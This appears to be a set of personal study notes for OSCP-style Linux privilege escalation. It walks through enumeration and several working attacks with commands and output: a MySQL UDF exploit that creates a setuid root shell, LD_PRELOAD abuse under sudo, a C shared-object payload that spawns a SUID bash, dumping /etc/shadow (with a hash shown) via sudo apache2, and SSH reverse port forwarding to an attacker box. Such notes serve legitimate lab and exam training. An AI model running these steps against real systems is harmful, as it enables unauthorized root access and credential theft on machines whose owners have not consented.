# Linux

## Summary

* Service Exploits
* **Weak File Permissions** - Readable /etc/shadow
* **Weak File Permissions** - Writeable /etc/shadow
* **Weak File Permissions** - Writeable /etc/passwd
* **Sudo** - Shell Escape Sequences
* **Sudo** - Environment Variables
* **Cron Jobs** - File Permissions
* **Cron Jobs** - PATH Environment Variable
* **Cron Jobs** - Wildcards
* **SUID/SGID Executables** - Known Exploits
* **SUID/SGID Executables** -  Shared Object Injection
* **SUID/SGID Executables** - Environment Variables
* **SUID/SGID Executables** - Abusing Shell Features (#1)
* **SUID/SGID Executables** - Abusing Shell Features (#2)
* **Passwords & Keys** - History Files
* **Passwords & Keys** - Config Files
* **Passwords & Keys** - SSH Keys
* NFS
* Kernel Exploits
* Privilege Escalation Scripts

## Linux Smart Enumeration Script / LinPeas.sh

Remember, not everything will be found by these enumeration scripts. It's highly unlikely that you will find anything extremely interesting in an OSCP exam box, for instance.

## Dirty Cow (Kernel Exploit)

## Interesting Files

* **/home/\<user>/.viminfo** - File used to track history of vim editing, could show sensitive information
* **ssh keys**
* /etc/passwd
* **.bash\_history**
* /etc/shadow
* Files writeable by group you're in and root
* Files by special groups
* suid / guid files

## LinEnum.sh

```bash
$ ./Linenum.sh -h

#########################################################
# Local Linux Enumeration & Privilege Escalation Script #
#########################################################
# www.rebootuser.com | @rebootuser 
# version 0.982

# Example: ./LinEnum.sh -k keyword -r report -e /tmp/ -t 

OPTIONS:
-k      Enter keyword
-e      Enter export location
-s      Supply user password for sudo checks (INSECURE)
-t      Include thorough (lengthy) tests
-r      Enter report name                                                                                                                                                                                                                  
-h      Displays this help text                                                                                                                                                                                                            
                                                                                                                                                                                                                                           
                                                                                                                                                                                                                                           
Running with no options = limited scans/no output file                                                                                                                                                                                     
######################################################### 
```

What's cool about LinEnum is that it can download and export interesting files with -e and -k

```bash
$ ./Linenum.sh -k password -e <export dir>
```

## Enumerate Programs / Services running as root + version

```bash
$ ps aux | grep "^root" #Shows all services running as root
$ <program> --version #Look at previously found root programs' version
# Running a program with --version/-v often shows version number

# On Debian, DPKG can show installed programs and versions
$ dpkg -l | grep <program>

# On RPM systems
$ rpm -qa | grep <program>
```

## MySql Privilege Escalation

mysqld --version\
User-defined functions when mysql is running as root

{% embed url="https://www.exploit-db.com/exploits/1518" %}

For this exploit to work, you must compile it differently if mysql is running as 64-bit. mysql must also be running as root for this to work and you either need creds to the database which is running as root, or you need to have to be able to log into the database as root with no password. If those conditions exist....too easy.\
&#x20;

{% code title="To compile for 64bit" %}
```bash
$ gcc -g -c raptor_udf2.c -fPIC

#The commands are also a little different since the exploit \
#was written for an older version of SQL
#The Location of the dump file
mysql>  use mysql;
mysql>  insert into foo values(load_file('/home/user/raptor_udf2.so'));
mysql>  select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
mysql>  create function do_system returns integer soname 'raptor_udf2.so';
# Making sure what we created is actually created
mysql>  select * from mysql.func;
+-----------+-----+----------------+----------+
| name      | ret | dl             | type     |
+-----------+-----+----------------+----------+
| do_system |   2 | raptor_udf2.so | function |
+-----------+-----+----------------+----------+


mysql> select do_system('cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash')
    -> ;
+-----------------------------------------------------------------+
| do_system('cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash') |
+-----------------------------------------------------------------+
|                                                               0 |
+-----------------------------------------------------------------+

mysql> exit


$ /tmp/rootbash -p
# whoami
root
```
{% endcode %}

## Port Forwarding

It's possible that a root process may be bound to an internal port. If an exploit cannot work locally, we can forward the port using SSH to kali

```bash
$ ssh -R <local-port>:127.0.0.1:<service-port> <username>@<kalimachine>
```

Now we should be able to run the exploit by setting the RHOST and PORT to whatever it was that we chose.

### Example

```bash
netstat -ano
#You can see below that Mysql (3306)
#is bound to the local host (127.0.0.1)
#as opposed to 0.0.0.0
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      off (0.00/0/0)

#From the victim machine
$ ssh -R 4444:127.0.0.1:3306 kali@<kali ip>

#From Kali
$ mysql -u root -h 127.0.0.1 -P 4444
mysql > select @@hostname;
+------------+
| @@hostname |
+------------+
| debian     |
+------------+

```

### Weak File Permissions

Replacing/Appending /etc/passwd

{% embed url="https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation/" %}

Replacing/Appending /etc/shadow&#x20;

{% embed url="https://medium.com/@int0x33/day-40-privilege-escalation-linux-by-modifying-shadow-file-for-the-easy-win-aff61c1c14ed" %}

## Backups

Explore file system for backups

* /
* /root
* /tmp
* /var/backups
* Maybe look for an ssh private key (is there a way to search for that?)

## Resources

* [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/) - Very good documentation on linux-privilege-escalation
* [https://gtfobins.github.io/](https://gtfobins.github.io/) - List of the things you can do with certain bins with odd permissions if found
* [https://github.com/jondonas/linux-exploit-suggester-2](https://github.com/jondonas/linux-exploit-suggester-2) - Mentioned by Tib3rius as a tool to use to check for kernel exploits (ie - DirtyC0w)
*

[https://forum.hackthebox.eu/discussion/1730/a-script-kiddie-s-guide-to-passing-oscp-on-your-first-attempt](https://forum.hackthebox.eu/discussion/1730/a-script-kiddie-s-guide-to-passing-oscp-on-your-first-attempt)

## Sudo

```bash
sudo <program> # Run program as superuser
sudo -u <username> <program> #run program as another user
sudo -l # List programs is allowed/disallowed to run
sudo -s
sudo -i
sudo /bin/bash
sudo passwd
```

Probably everything you wanted to know about sudo

{% embed url="https://www.hackingarticles.in/linux-privilege-escalation-using-exploiting-sudo-rights/" %}

### - Shell Escape(s)

* [https://gtfobins.github.io/](https://gtfobins.github.io/)

Even if there are no bins shell escapes, there still may be a way\
I**f I have sudo access to apache2:**

```bash
$ sudo apache2 -f /etc/shadow
Syntax error on line 1 of /etc/shadow:
Invalid command 'root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0           :17298:0:99999:7:::', perhaps misspelled or defined by a module not included in the server configuration
```

### - Environment Variables

In the /etc/sudoers file, if the env\_reset option is set, sudo will run programs in a new, minimal environment (run sudo -l to check)\


### &#x20;**LD\_PRELOAD**

LD\_PRELOAD is an evironment varibale which can be set to the path of a shared object (.so) file. When set the object will be loaded before any others. By creating an init() function, we can execute code when the object is loaded

```bash
user@debian:~$ sudo -l
Matching Defaults entries for user on this host:
env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH
#Notice env_keep=LD_PRELOAD
#Example:
#Compiling C file into shared object which just basically spawns a shell
user@debian:~/tools/sudo$ gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
# Running a command (in this case "find") that we have sudo access to and setting LD_PELOAD to our shared object
# This shared object file will be executed first (and its obviously malicious)
user@debian:~/tools/sudo$ sudo LD_PRELOAD=/tmp/preload.so find
#Profit.
root@debian:/home/user/tools/sudo
```

Shared Object Injection

If an exploit you need requires an .so and you have access to gcc, you can create a shared object like&#x20;

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

And then

```bash
 gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
```

## Cronjobs / Crontabs

* /var/spool/cron/ - Configuration for cron jobs
* /var/spool/cron/crontabs - User
* /etc/crontab - System-wide

